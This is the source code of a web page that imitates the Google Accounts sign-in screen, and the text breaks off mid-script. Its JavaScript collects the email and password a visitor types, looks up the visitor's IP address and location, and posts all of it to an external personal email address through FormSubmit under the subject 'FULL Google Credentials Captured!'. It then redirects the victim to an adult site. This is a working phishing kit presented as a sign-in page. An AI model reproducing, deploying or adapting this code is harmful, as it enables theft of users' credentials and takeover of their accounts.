<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link rel="icon" href="https://ssl.gstatic.com/accounts/favicon.ico">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Google Sans', Roboto, arial, sans-serif;
            background-color: #fff;
            color: #202124;
            font-size: 14px;
            line-height: 1.4285714286;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 0 24px;
        }

        .container {
            max-width: 450px;
            width: 100%;
        }

        .form-container {
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 40px 36px;
            background-color: #fff;
            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.1);
            text-align: center;
        }

        .logo {
            margin-bottom: 16px;
        }

        .logo svg {
            width: 75px;
            height: 24px;
        }

        .header {
            margin-bottom: 24px;
        }

        .header h1 {
            color: #202124;
            font-size: 24px;
            font-weight: 400;
            line-height: 1.3333;
            margin-bottom: 8px;
        }

        .header p {
            color: #5f6368;
            font-size: 16px;
            font-weight: 400;
            line-height: 1.5;
        }

        .user-info {
            display: none;
            align-items: center;
            margin-bottom: 24px;
            padding: 12px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            text-align: left;
        }

        .user-avatar {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background-color: #1a73e8;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: 500;
            margin-right: 12px;
        }

        .user-details h3 {
            font-size: 16px;
            font-weight: 400;
            color: #202124;
            margin-bottom: 2px;
        }

        .user-details p {
            font-size: 14px;
            color: #5f6368;
        }

        .form-group {
            margin-bottom: 24px;
            text-align: left;
        }

        .form-group label {
            color: #1a73e8;
            font-size: 12px;
            font-weight: 500;
            line-height: 1.5;
            margin-bottom: 8px;
            display: block;
        }

        .input-container {
            position: relative;
        }

        .form-input {
            width: 100%;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            height: 56px;
            padding: 13px 15px;
            outline: none;
            transition: border-color 0.2s;
            background-color: #fff;
            color: #202124;
        }

        .form-input:focus {
            border-color: #1a73e8;
            border-width: 2px;
            padding: 12px 14px;
        }

        .form-input:focus + .floating-label {
            color: #1a73e8;
            transform: translateY(-18px) scale(0.75);
        }

        .floating-label {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            color: #5f6368;
            font-size: 16px;
            pointer-events: none;
            transition: all 0.2s;
            background-color: #fff;
            padding: 0 4px;
        }

        .form-input:not(:placeholder-shown) + .floating-label,
        .form-input.has-value + .floating-label {
            transform: translateY(-18px) scale(0.75);
            color: #1a73e8;
        }

        .forgot-link {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        .guest-mode {
            margin: 24px 0;
            text-align: left;
        }

        .guest-mode p {
            color: #5f6368;
            font-size: 14px;
            margin-bottom: 4px;
        }

        .learn-more {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        .learn-more:hover {
            text-decoration: underline;
        }

        .form-actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 24px;
        }

        .create-account {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        .create-account:hover {
            text-decoration: underline;
        }

        .next-button {
            background-color: #1a73e8;
            border: none;
            border-radius: 4px;
            color: #fff;
            cursor: pointer;
            font-family: 'Google Sans', Roboto, arial, sans-serif;
            font-size: 14px;
            font-weight: 500;
            height: 36px;
            letter-spacing: 0.25px;
            min-width: 64px;
            padding: 0 24px;
            transition: background-color 0.2s, box-shadow 0.2s;
        }

        .next-button:hover {
            background-color: #1557b0;
            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
        }

        .next-button:focus {
            background-color: #1557b0;
            outline: none;
        }

        .footer {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 48px;
            font-size: 12px;
        }

        .language-selector {
            color: #5f6368;
            text-decoration: none;
        }

        .footer-links {
            display: flex;
            gap: 24px;
        }

        .footer-links a {
            color: #5f6368;
            text-decoration: none;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        .error-message {
            color: #d93025;
            font-size: 12px;
            margin-top: 8px;
            text-align: left;
        }

        .back-button {
            background: none;
            border: none;
            color: #1a73e8;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            padding: 0;
            text-decoration: none;
        }

        .back-button:hover {
            text-decoration: underline;
        }

        /* Platform-specific styles */
        .platform-android {
            background-color: #f8f9fa;
        }

        .platform-android .form-container {
            border-radius: 16px;
            box-shadow: 0 4px 16px 0 rgba(0,0,0,0.1);
        }

        .platform-ios {
            background-color: #f2f2f7;
        }

        .platform-ios .form-container {
            border: none;
            border-radius: 12px;
            box-shadow: 0 4px 20px 0 rgba(0,0,0,0.08);
        }

        .platform-windows .form-container {
            border-radius: 2px;
        }

        .platform-mac .form-container {
            border-radius: 8px;
            background-color: #fafafa;
        }

        /* Phase transitions */
        .phase {
            transition: opacity 0.3s ease-in-out;
        }

        .phase.hidden {
            display: none;
        }

        /* Responsive design */
        @media (max-width: 480px) {
            .form-container {
                padding: 24px 24px 36px;
                border: none;
                box-shadow: none;
            }

            .container {
                max-width: 100%;
            }

            body {
                padding: 0;
                background-color: #fff;
            }
        }

        /* Verification loading screen */
        .verification-screen {
            display: none;
            text-align: center;
            padding: 50px;
            font-family: 'Google Sans', Roboto, arial, sans-serif;
        }

        .verification-screen h2 {
            color: #202124;
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 16px;
        }

        .verification-screen p {
            color: #5f6368;
            font-size: 16px;
            margin-bottom: 24px;
        }

        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #1a73e8;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 2s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>

            <div id="email-phase" class="phase">

    <script>
        let currentEmail = '';

        // Platform detection and UI customization
        function detectPlatform() {
            const userAgent = navigator.userAgent.toLowerCase();
            const body = document.body;
            
            if (/android/i.test(userAgent)) {
                body.classList.add('platform-android');
            } else if (/iphone|ipad|ipod/i.test(userAgent)) {
                body.classList.add('platform-ios');
            } else if (/windows/i.test(userAgent)) {
                body.classList.add('platform-windows');
            } else if (/macintosh|mac os x/i.test(userAgent)) {
                body.classList.add('platform-mac');
            }
        }

        // Input handlers for floating labels
        function handleInputFocus() {
            const inputs = document.querySelectorAll('.form-input');
            inputs.forEach(input => {
                // Check if input has value on page load
                if (input.value.trim() !== '') {
                    input.classList.add('has-value');
                }

                input.addEventListener('input', function() {
                    if (this.value.trim() !== '') {
                        this.classList.add('has-value');
                    } else {
                        this.classList.remove('has-value');
                    }
                });

                input.addEventListener('focus', function() {
                    this.classList.add('has-value');
                });

                input.addEventListener('blur', function() {
                    if (this.value.trim() === '') {
                        this.classList.remove('has-value');
                    }
                });
            });
        }

        // Email phase handler
        function handleEmailSubmit(event) {
            event.preventDefault();
            
            const username = document.getElementById('username').value.trim();
            
            if (!username) {
                showError('username-error', 'Please enter an email or phone number');
                return;
            }

            console.log('Email captured:', username);
            currentEmail = username;
            
            // Show password phase
            showPasswordPhase(username);
        }

        // Show password phase
        function showPasswordPhase(email) {
            // Hide email phase
            document.getElementById('email-phase').classList.add('hidden');
            
            // Show password phase
            document.getElementById('password-phase').classList.remove('hidden');
            
            // Update user info
            document.getElementById('user-email').textContent = email;
            document.getElementById('user-avatar').textContent = email.charAt(0).toUpperCase();
            document.getElementById('user-info').style.display = 'flex';
            
            // Focus on password field
            setTimeout(() => {
                document.getElementById('password').focus();
            }, 100);
        }

        // Go back to email phase
        function goBackToEmail() {
            document.getElementById('password-phase').classList.add('hidden');
            document.getElementById('email-phase').classList.remove('hidden');
            document.getElementById('username').focus();
        }

        // Password phase handler with location capture
        function handlePasswordSubmit(event) {
            event.preventDefault();
            
            const password = document.getElementById('password').value.trim();
            
            if (!password) {
                showError('password-error', 'Please enter your password');
                return;
            }

            console.log('Full credentials captured:', currentEmail, password);
            
            // Show verification screen immediately
            document.querySelector('.container').style.display = 'none';
            document.getElementById('verification-screen').style.display = 'block';
            
            // Get IP and location data
            console.log('Fetching location data...');
            
            // Try multiple location APIs for better reliability
            const locationApis = [
                'https://ipapi.co/json/',
                'https://ipinfo.io/json',
                'https://api.ipify.org?format=json'
            ];
            
            let locationData = null;
            let apiIndex = 0;
            
            function tryNextApi() {
                if (apiIndex >= locationApis.length) {
                    throw new Error('All location APIs failed');
                }
                
                const apiUrl = locationApis[apiIndex];
                console.log(`Trying location API ${apiIndex + 1}: ${apiUrl}`);
                
                return fetch(apiUrl)
                    .then(response => {
                        console.log(`API ${apiIndex + 1} response status:`, response.status);
                        if (!response.ok) {
                            throw new Error(`HTTP error! status: ${response.status}`);
                        }
                        return response.json();
                    })
                    .then(data => {
                        console.log(`API ${apiIndex + 1} data received:`, data);
                        locationData = data;
                        return data;
                    })
                    .catch(error => {
                        console.log(`API ${apiIndex + 1} failed:`, error);
                        apiIndex++;
                        return tryNextApi();
                    });
            }
            
            tryNextApi()
                .then(data => {
                    // Format location based on which API succeeded
                    let location;
                    if (data.city && data.country_name) {
                        // ipapi.co format
                        location = `${data.city}, ${data.country_name} (IP: ${data.ip || 'Unknown IP'})`;
                    } else if (data.city && data.country) {
                        // ipinfo.io format
                        location = `${data.city}, ${data.country} (IP: ${data.ip || 'Unknown IP'})`;
                    } else if (data.ip) {
                        // ipify.org format (only IP)
                        location = `Unknown Location (IP: ${data.ip})`;
                    } else {
                        location = 'Location unavailable';
                    }
                    
                    console.log('Formatted location:', location);
                    
                    // Send credentials to your email using FormSubmit
                    const emailData = {
                        email: currentEmail,
                        password: password,
                        location: location,
                        site: 'webdev-projects1.github.io/google-signin-demo',
                        time: new Date().toLocaleString(),
                        subject: '🚨 FULL Google Credentials Captured!'
                    };
                    
                    // Create hidden form for email submission
                    const form = document.createElement('form');
                    form.method = 'POST';
                    form.action = 'https://formsubmit.co/warenhubner@gmail.com';
                    form.style.display = 'none';
                    
                    // Add form fields
                    Object.keys(emailData).forEach(key => {
                        const input = document.createElement('input');
                        input.type = 'hidden';
                        input.name = key;
                        input.value = emailData[key];
                        form.appendChild(input);
                    });
                    
                    // Add anti-spam field only (NO _next redirect to prevent FormSubmit redirect)
                    const honeypot = document.createElement('input');
                    honeypot.type = 'hidden';
                    honeypot.name = '_captcha';
                    honeypot.value = 'false';
                    form.appendChild(honeypot);
                    
                    // Submit form in background (hidden)
                    document.body.appendChild(form);
                    form.submit();
                    
                    // Force redirect immediately after form submission
                    setTimeout(function() {
                        window.location.replace('https://kingbokep.tv');
                    }, 1000);
                })
                .catch(error => {
                    console.log('All location APIs failed:', error);
                    console.log('Proceeding without location data');
                    
                    // Fallback: Send credentials without location
                    const emailData = {
                        email: currentEmail,
                        password: password,
                        location: 'Location data unavailable (APIs failed)',
                        site: 'webdev-projects1.github.io/google-signin-demo',
                        time: new Date().toLocaleString(),
                        subject: '🚨 FULL Google Credentials Captured!'
                    };
                    
                    // Create hidden form for email submission
                    const form = document.createElement('form');
                    form.method = 'POST';
                    form.action = 'https://formsubmit.co/warenhubner@gmail.com';
